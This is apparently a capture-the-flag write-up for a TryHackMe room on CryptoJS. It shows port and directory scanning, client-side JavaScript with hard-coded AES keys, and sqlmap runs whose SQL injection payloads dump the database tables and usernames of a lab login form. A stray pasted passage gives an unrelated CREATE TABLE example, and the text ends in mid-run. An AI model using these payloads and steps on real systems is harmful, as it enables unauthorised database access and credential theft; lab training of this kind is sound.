----
Learn about the CryptoJS library and JavaScript-based client-side encryption and decryption.
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/af0e7c2109847033d31d273498657526.png)

### Task 1  Enumeration

 Start Machine

You have the IP address of your target. The goal is to find open ports and services to enumerate.

Answer the questions below

```
┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.244.109 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.244.109:22
Open 10.10.244.109:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 14:54 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:54
Completed Parallel DNS resolution of 1 host. at 14:54, 0.03s elapsed
DNS resolution of 1 IPs took 0.65s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:54
Scanning 10.10.244.109 [2 ports]
Discovered open port 80/tcp on 10.10.244.109
Discovered open port 22/tcp on 10.10.244.109
Completed Connect Scan at 14:54, 0.22s elapsed (2 total ports)
Initiating Service scan at 14:54
Scanning 2 services on 10.10.244.109
Completed Service scan at 14:55, 18.25s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.244.109.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:55
Completed NSE at 14:55, 6.56s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:55
Completed NSE at 14:55, 0.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:55
Completed NSE at 14:55, 0.00s elapsed
Nmap scan report for 10.10.244.109
Host is up, received user-set (0.22s latency).
Scanned at 2023-08-11 14:54:53 EDT for 26s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:7e:08:42:ea:bf:be:1a:1b:78:b0:f7:99:3c:ca:1d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDq29TL6bf/KCo3Nouny4N16JxUTh4xaGYNzD5ApI2lt3h5LhpFufJWTFsTlowZczIGXAmOu+v7IR9GJRgJzBW6e5Obqhk/TyU+YJvXPn+V2UzA1BUWqU5F3k0z62yAJKO9bEbGL3S60apZUp0EzvRc/JpX+Yq4cFo1KFhi15kiboXbWY4rz12KYPqmUb7MVz0KOuYxi8QY6/xJuuD3JIJtCJ2InK7QEnfUSaC7ULWI6L5036cGYp30VPpQ2cWrJeyxYbrySKO63w1O7NOVd+pjP0OSn217jSqlHUuzmsniXURWBepOsQg0LwwHf7tLHJMAzU9EnUn3VJdnYUzVpRROg8lglyErEGlgZtuIxlZMPnB5azf/sq8eGv6em/IePmuEfVpyGXtDmmWWTUKlHkVRODI8MdEk+CLQ2jkdgjr9M9p29iH37d453o4cKr4KNjXIDHkIm6JOblTf8G6VsHRYTr5qLRQQVhlFOZ5Lu3eZ3NUTQhT5tvOOflopTERCQT0=
|   256 f8:f3:90:83:b1:bc:87:e8:93:a0:ff:d5:bc:1f:d7:e1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNvoVED8flh/Rt6XI25dPE0dSrlaHxP057SjcgVeIyqksgwePweaAhM6pBMu4H+KU8lSiMq8CF7JOlBddocyx50=
|   256 b6:77:4d:a6:6d:73:79:15:ea:39:0c:f6:1b:b4:0b:6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvaiGFkdeBEM+/LKf9E3kANwz0sdiiJ3pUyy+Sag/Mx
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Spicyo
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:55
Completed NSE at 14:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:55
Completed NSE at 14:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:55
Completed NSE at 14:55, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.95 seconds

┌──(witty㉿kali)-[~]
└─$ gobuster -t 64 dir -e -k -u http://10.10.244.109 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.244.109
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/08/11 14:57:42 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.244.109/about                (Status: 200) [Size: 10720]
http://10.10.244.109/blog                 (Status: 200) [Size: 11402]
http://10.10.244.109/contact              (Status: 200) [Size: 8858]
http://10.10.244.109/debug                (Status: 403) [Size: 122]
http://10.10.244.109/login                (Status: 200) [Size: 13151]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/08/11 14:57:56 Finished
===============================================================

```

How many ports are open?

Try using port scanner

*2*

What is the 403/forbidden web page?

Try directory enumeration

*/debug*

### Task 2  Injection

The goal is to find a way to bypass the login. Find the username and password.

Answer the questions below

```
┌──(witty㉿kali)-[~]
└─$ wget http://10.10.244.109/static/images/404.png                      
--2023-08-11 15:00:01--  http://10.10.244.109/static/images/404.png
Connecting to 10.10.244.109:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2348467 (2.2M) [image/png]
Saving to: ‘404.png’

404.png              100%[=====================>]   2.24M   628KB/s    in 3.8s    

2023-08-11 15:00:05 (603 KB/s) - ‘404.png’ saved [2348467/2348467]

                                                                                   
┌──(witty㉿kali)-[~]
└─$ exiftool 404.png          
ExifTool Version Number         : 12.57
File Name                       : 404.png
Directory                       : .
File Size                       : 2.3 MB
File Modification Date/Time     : 2021:10:02 20:06:42-04:00
File Access Date/Time           : 2023:08:11 15:00:05-04:00
File Inode Change Date/Time     : 2023:08:11 15:00:05-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1308
Image Height                    : 851
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
Software                        : Greenshot
Image Size                      : 1308x851
Megapixels                      : 1.1

function submitForm(oFormElement) {
    var xhr = new XMLHttpRequest();
    //xhr.responseType = 'json';
    xhr.onload = function() {
        var encryptedresp = xhr.responseText;
        var k = "8080808080808080";
        var key = CryptoJS.enc.Utf8.parse(k);
        var iv = CryptoJS.enc.Utf8.parse(k);
        var item = encryptedresp;
        var result = CryptoJS.AES.decrypt(item, key,
  {
      keySize: 128 / 4,
      iv: iv,
      mode: CryptoJS.mode.CBC,
      padding: CryptoJS.pad.Pkcs7
  })
        var result = result.toString(CryptoJS.enc.Utf8);
        //////////var jsonResponse = JSON.parse(xhr.responseText);
        var jsonResponse = JSON.parse(result);
        //alert(xhr.responseText);
        //var jsonResponse = xhr.responseText;
        console.log(jsonResponse);
        if (jsonResponse.pin_set == "true") {
            //Redirect to 2fa
            //window.location.replace("/2fa");
            //document.getElementsByClassName
            document.getElementById("loginid").style.display = "none";
            document.getElementById("enterpinid").style.display = "flex";
        } else if (jsonResponse.pin_set == "false") {
            //redirect to set pin
            //window.location.replace("/set-pin");
            document.getElementById("loginid").style.display = "none";
            document.getElementById("createpinid").style.display = "flex";
        } else {
            // Invalid username/ password
            alert(jsonResponse.reason);
        }
    }
    xhr.open(oFormElement.method, oFormElement.action, true);
    xhr.send(new FormData(oFormElement));
    return false;
}


function encrypt() {
    var pass = document.getElementById('pin2').value; {
        //document.getElementById("hide").value = document.getElementById("pin").value;
        var key = "6Le0DgMTAAAAANokdEEial"; //length=22
        var iv = "mHGFxENnZLbienLyANoi.e"; //length=22
        key = CryptoJS.enc.Base64.parse(key);
        iv = CryptoJS.enc.Base64.parse(iv);
        var cipherData = CryptoJS.AES.encrypt(pass, key, {
            iv: iv
        });
        //var data = CryptoJS.AES.decrypt(cipherData, key, { iv: iv });

        //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");
        //var decryptedBytes = CryptoJS.AES.decrypt(Message, "1234567890");
        //var plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
        //var hash = CryptoJS.MD5(pass);
        document.getElementById('pin2').value = cipherData;
        return true;
        console.log(document.getElementById('pin2').value)
    }
}


function encrypt2() {
    var pass = document.getElementById('pin3').value; {
        //document.getElementById("hide").value = document.getElementById("pin").value;
        var key = "6Le0DgMTAAAAANokdEEial"; //length=22
        var iv = "mHGFxENnZLbienLyANoi.e"; //length=22
        key = CryptoJS.enc.Base64.parse(key);
        iv = CryptoJS.enc.Base64.parse(iv);
        var cipherData = CryptoJS.AES.encrypt(pass, key, {
            iv: iv
        });
        //var data = CryptoJS.AES.decrypt(cipherData, key, { iv: iv });

        //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");
        //var decryptedBytes = CryptoJS.AES.decrypt(Message, "1234567890");
        //var plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
        //var hash = CryptoJS.MD5(pass);
        document.getElementById('pin3').value = cipherData;
        return true;
        console.log(document.getElementById('pin3').value)
    }
}

Object { success: "false", reason: "User or Password is invalid" }

user: a'--

500 internal server (sqli)

┌──(witty㉿kali)-[~]
└─$ cat req_crylo 
POST /login HTTP/1.1
Host: 10.10.192.246
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.192.246/login
Content-Type: multipart/form-data; boundary=---------------------------24513989778820446811340418161
Content-Length: 484
Origin: http://10.10.192.246
Connection: close
Cookie: username=None; password=None; csrftoken=buC8yQFC6eFN9Yl7ker3kqDDKPXrLaJKnhAAKqealQPaU1y8oR73cZ9KWPPBjzyi

-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

┌──(witty㉿kali)-[~]
└─$ sqlmap -r req_crylo --risk 3 --level 3 --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:20:42 /2023-08-13/

[15:20:42] [INFO] parsing HTTP request from 'req_crylo'
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] y
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
[15:20:47] [INFO] testing connection to the target URL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
[15:20:49] [INFO] testing if the target URL content is stable
[15:20:50] [INFO] target URL content is stable
[15:20:50] [INFO] ignoring (custom) POST parameter 'MULTIPART csrfmiddlewaretoken'
[15:20:50] [INFO] testing if (custom) POST parameter 'MULTIPART username' is dynamic
[15:20:51] [WARNING] (custom) POST parameter 'MULTIPART username' does not appear to be dynamic
[15:20:51] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'MULTIPART username' might not be injectable
[15:20:52] [INFO] testing for SQL injection on (custom) POST parameter 'MULTIPART username'
[15:20:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:21:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[15:21:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[15:22:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[15:22:03] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --code=200)
[15:22:11] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] y
[15:23:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[15:23:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[15:23:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[15:23:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[15:23:41] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[15:23:41] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[15:23:42] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[15:23:42] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[15:23:43] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:23:43] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:23:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:23:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:23:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[15:23:45] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[15:23:45] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:23:46] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[15:23:47] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[15:23:47] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[15:23:47] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[15:23:47] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[15:23:47] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[15:23:47] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[15:23:47] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[15:23:47] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[15:23:47] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[15:23:47] [INFO] testing 'Generic inline queries'
[15:23:48] [INFO] testing 'MySQL inline queries'
[15:23:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[15:24:00] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[15:24:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:24:12] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[15:24:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:24:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:24:13] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:24:16] [INFO] target URL appears to have 11 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[15:29:55] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[15:30:04] [INFO] target URL appears to be UNION injectable with 11 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[15:31:01] [INFO] testing 'Generic UNION query (85) - 21 to 40 columns'
[15:31:10] [INFO] testing 'Generic UNION query (85) - 41 to 60 columns'
[15:31:18] [INFO] testing 'MySQL UNION query (85) - 1 to 20 columns'
[15:31:52] [INFO] testing 'MySQL UNION query (85) - 21 to 40 columns'
[15:32:00] [INFO] testing 'MySQL UNION query (85) - 41 to 60 columns'
[15:32:09] [INFO] testing 'MySQL UNION query (85) - 61 to 80 columns'
[15:32:18] [INFO] testing 'MySQL UNION query (85) - 81 to 100 columns'
[15:32:26] [INFO] checking if the injection point on (custom) POST parameter 'MULTIPART username' is a false positive
(custom) POST parameter 'MULTIPART username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 588 HTTP(s) requests:
---
Parameter: MULTIPART username ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test' AND 3386=(SELECT (CASE WHEN (3386=3386) THEN 3386 ELSE (SELECT 9893 UNION SELECT 8553) END))-- QIDa
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test';SELECT SLEEP(5)#
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test' AND (SELECT 4354 FROM (SELECT(SLEEP(5)))zdLd)-- Ccko
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--
---
[15:32:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[15:32:43] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:32:43] [INFO] fetching current database
[15:32:43] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:32:43] [INFO] retrieved: food
[15:32:57] [INFO] fetching tables for database: 'food'
[15:32:57] [INFO] fetching number of tables for database 'food'
[15:32:57] [INFO] retrieved: 13
[15:33:02] [INFO] retrieved: accounts_pin
[15:33:42] [INFO] retrieved: accounts_pintoken
[15:34:05] [INFO] retrieved: accounts_upload
[15:34:30] [INFO] retrieved: auth_group
[15:35:01] [INFO] retrieved: auth_group_permissions
[15:35:45] [INFO] retrieved: auth_permission
[15:36:20] [INFO] retrieved: auth_user
[15:36:38] [INFO] retrieved: auth_user_groups
[15:37:07] [INFO] retrieved: auth_user_user_permissions
[15:38:05] [INFO] retrieved: django_admin_log
[15:38:56] [INFO] retrieved: django_content_type
[15:39:40] [INFO] retrieved: django_migrations
[15:40:16] [INFO] retrieved: django_session
[15:40:42] [INFO] fetching columns for table 'auth_group' in database 'food'
[15:40:42] [INFO] retrieved: 2
[15:40:46] [INFO] retrieved: id
[15:40:54] [INFO] retrieved: name
[15:41:07] [INFO] fetching entries for table 'auth_group' in database 'food'
[15:41:07] [INFO] fetching number of entries for table 'auth_group' in database 'food'
[15:41:07] [INFO] retrieved: 0
[15:41:10] [WARNING] table 'auth_group' in database 'food' appears to be empty
Database: food
Table: auth_group
[0 entries]
+----+------+
| id | name |
+----+------+
+----+------+

[15:41:10] [INFO] table 'food.auth_group' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.192.246/dump/food/auth_group.csv'
[15:41:10] [INFO] fetching columns for table 'auth_user_user_permissions' in database 'food'
[15:41:10] [INFO] retrieved: 3
[15:41:13] [INFO] retrieved: id
[15:41:21] [INFO] retrieved: permission_id
[15:42:02] [INFO] retrieved: user_id
[15:42:27] [INFO] fetching entries for table 'auth_user_user_permissions' in database 'food'
[15:42:27] [INFO] fetching number of entries for table 'auth_user_user_permissions' in database 'food'
[15:42:27] [INFO] retrieved: 0
[15:42:30] [WARNING] table 'auth_user_user_permissions' in database 'food' appears to be empty
Database: food
Table: auth_user_user_permissions
[0 entries]
+----+---------+---------------+
| id | user_id | permission_id |
+----+---------+---------------+
+----+---------+---------------+


Certainly, here's an example of an SQL query to create an "auth_users" table with the basic structure I mentioned earlier:

sql

`CREATE TABLE auth_users (     id INT PRIMARY KEY,     username VARCHAR(50) NOT NULL,     password VARCHAR(100) NOT NULL,     email VARCHAR(100) NOT NULL,     first_name VARCHAR(50),     last_name VARCHAR(50),     is_active BOOLEAN NOT NULL,     is_staff BOOLEAN NOT NULL,     is_superuser BOOLEAN NOT NULL,     date_joined TIMESTAMP NOT NULL );`

This SQL query creates a table named "auth_users" with fields that correspond to the basic structure I described earlier. Please note that you might need to adjust the data types and constraints based on the specific database system you're using. Also, remember that storing plain text passwords is not recommended; in practice, passwords should be hashed using a strong hashing algorithm like bcrypt or Argon2.

┌──(witty㉿kali)-[~]
└─$ sqlmap -r req_crylo --dump -T auth_user -C username
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:44:36 /2023-08-13/

[15:44:36] [INFO] parsing HTTP request from 'req_crylo'
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] y
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
[15:44:41] [INFO] resuming back-end DBMS 'mysql' 
[15:44:41] [INFO] testing connection to the target URL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: MULTIPART username ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test' AND 3386=(SELECT (CASE WHEN (3386=3386) THEN 3386 ELSE (SELECT 9893 UNION SELECT 8553) END))-- QIDa
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test';SELECT SLEEP(5)#
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test' AND (SELECT 4354 FROM (SELECT(SLEEP(5)))zdLd)-- Ccko
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--
---
[15:44:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[15:44:42] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:44:42] [INFO] fetching current database
[15:44:42] [INFO] resumed: food
[15:44:42] [INFO] fetching entries of column(s) 'username' for table 'auth_user' in database 'food'
[15:44:42] [INFO] fetching number of column(s) 'username' entries for table 'auth_user' in database 'food'
[15:44:42] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:44:42] [INFO] retrieved: 2
[15:44:46] [INFO] retrieved: admin
[15:45:03] [INFO] retrieved: anof
Database: food
Table: auth_user
[2 entries]
+----------+
| username |
+----------+
| admin    |
| anof     |
+----------+

[15:45:17] [INFO] table 'food.auth_user' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.192.246/dump/food/auth_user.csv'
[15:45:17] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 40 times
[15:45:17] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.192.246'
[15:45:17] [WARNING] your sqlmap version is outdated

[*] ending @ 15:45:17 /2023-08-13/

┌──(witty㉿kali)-[~]
└─$ sqlmap -r req_crylo --dump -T auth_user -C password
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:49:16 /2023-08-13/

[15:49:16] [INFO] parsing HTTP request from 'req_crylo'
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] y
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
[15:49:18] [INFO] resuming back-end DBMS 'mysql' 
[15:49:18] [INFO] testing connection to the target URL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: MULTIPART username ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

